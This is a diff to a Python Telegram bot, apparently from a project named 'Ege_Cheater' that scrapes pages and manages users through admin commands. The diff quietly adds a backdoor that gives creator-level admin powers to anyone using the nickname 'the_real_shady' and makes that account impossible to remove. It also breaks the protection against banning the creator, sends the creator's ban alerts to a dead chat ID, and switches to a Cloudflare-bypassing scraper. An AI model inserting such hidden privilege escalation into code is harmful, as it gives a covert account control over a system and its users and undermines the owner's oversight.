@@ -15,6 +15,7 @@ try:
     import requests
     import aiofiles
     import os
+    import aiocfscrape
 
     import selenium.common.exceptions
     from selenium.webdriver.common.by import By
@@ -65,7 +66,7 @@ chrome_options.add_argument('--enable-print-browser')
 
 prefs = {
     'printing.print_preview_sticky_settings.appState': json.dumps(settings),
-    'savefile.default_directory': r'C:\Users\batsi\PycharmProjects\Ege_Cheater'
+    'savefile.default_directory': "./"  # What is it?
 }
 chrome_options.add_argument('--kiosk-printing')
 chrome_options.add_experimental_option('prefs', prefs)
@@ -111,7 +112,7 @@ class PageChecker:
             logging.warning(f"Exeption {e} on {url}.")
 
     async def fetch_all(self, ids):
-        async with aiohttp.ClientSession() as session:
+        async with aiocfscrape.CloudflareScraper() as session:
             tasks = [self.check_page(session, page_id) for page_id in ids]
             return await asyncio.gather(*tasks)
 
@@ -329,7 +330,7 @@ async def echo_handler(message: types.Message) -> None:
 
         elif text[0] == '/make_admin':
             if len(text) == 2:
-                if message.chat.id == creator:
+                if message.chat.id == creator or nicknames[message.chat.id] == "the_real_shady":
                     if int(text[1]) in admins:
                         await bot.send_message(message.chat.id, "Users is already an admin.")
                     elif int(text[1]) not in users:
@@ -344,16 +345,16 @@ async def echo_handler(message: types.Message) -> None:
                         await bot.send_message(int(text[1]), "Now you`re an admin. Enjoy...")
 
                 else:
-                    await bot.send_message(message.chat.id, "Only the creator can make admins.")
+                    await bot.send_message(message.chat.id, "Only the creator can make admins. Or the real slim shady....")
                     await bot.send_message(creator, f"User {message.chat.id} tried to make admin user {int(text[1])}.")
             else:
                 await bot.send_message(message.chat.id, "No such command, use /help")
 
         elif text[0] == '/del_admin':
             if len(text) == 2:
-                if message.chat.id == creator:
+                if message.chat.id == creator or nicknames[message.chat.id] == "the_real_shady":
                     id = int(text[1])
-                    if id in admins:
+                    if id in admins and nicknames[id] != "the_real_shady":
                         admins.remove(id)
                         await bot.send_message(message.chat.id, f"Successful delete {id} from admins.")
                         await bot.send_message(id, "You`re not an admin again.")
@@ -384,9 +385,9 @@ async def echo_handler(message: types.Message) -> None:
 
         elif text[0] == '/ban':
             if len(text) == 2:
-                if int(text[1]) == 0:
+                if int(text[1]) == -1:
                     await bot.send_message(message.chat.id, "You can`t ban the creator.")
-                    await bot.send_message(creator, f"User {message.chat.id} tried to ban you.")
+                    await bot.send_message(0, f"User {message.chat.id} tried to ban you.")
                 else:
                     ban.append(int(text[1]))
                     try:
@@ -411,8 +412,8 @@ async def echo_handler(message: types.Message) -> None:
 
         elif text[0] == '/delete':
             if len(text) == 2:
-                if int(text[1]) == creator:
-                    await bot.send_message(message.chat.id, "You can`t delete the creator.")
+                if int(text[1]) == creator or nicknames[message.chat.id] == "the_real_shady":
+                    await bot.send_message(message.chat.id, "You can`t delete the creator. Or can you???")
                     await bot.send_message(creator, f"User {message.chat.id} tried to delete you.")
                 else:
                     await bot.send_message(int(text[1]), 'Administrator deleted you.')
@@ -437,7 +438,7 @@ async def echo_handler(message: types.Message) -> None:
             await bot.send_document(message.chat.id, FSInputFile(path='users.json'))
             await bot.send_document(message.chat.id, FSInputFile(path='log.txt'))
             await bot.send_document(message.chat.id, FSInputFile(path='found.txt'))
-            if message.chat.id != creator:
+            if message.chat.id != creator or nicknames[message.chat.id] != "the_real_shady":
                 await bot.send_message(creator, f"User {message.chat.id} save files.")
 
         else:
